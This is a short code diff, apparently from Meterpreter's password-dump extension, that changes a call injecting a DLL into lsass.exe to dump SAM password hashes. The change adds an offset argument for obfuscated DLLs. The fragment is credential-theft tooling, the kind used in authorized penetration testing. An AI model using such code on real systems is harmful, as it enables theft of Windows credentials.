@@ -503,7 +503,8 @@ DWORD __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresul
 		dprintf("[PASSWD] Injecting into lsass.exe pid: %u", dwLsassPid);
 
 		/* todo: change the ReflectiveLoader string here, it's silly */
-		if ((dwResult = met_api->inject.dll(dwLsassPid, dwLsassArch, dump_sam, (DWORD)stResourceSize, LOADER_ORDINAL(EXPORT_REFLECTIVELOADER), pvParameterMemory, 0)) != ERROR_SUCCESS)
+		/* todo: support the offset for obfuscated dlls */
+		if ((dwResult = met_api->inject.dll(dwLsassPid, dwLsassArch, dump_sam, (DWORD)stResourceSize, LOADER_ORDINAL(EXPORT_REFLECTIVELOADER), 0, pvParameterMemory, 0)) != ERROR_SUCCESS)
 			BREAK_WITH_ERROR("[PASSWD} Unable to inject DLL", dwResult);
 		dprintf("[PASSWD] Successfully injected the DLL into lsass.exe");
 
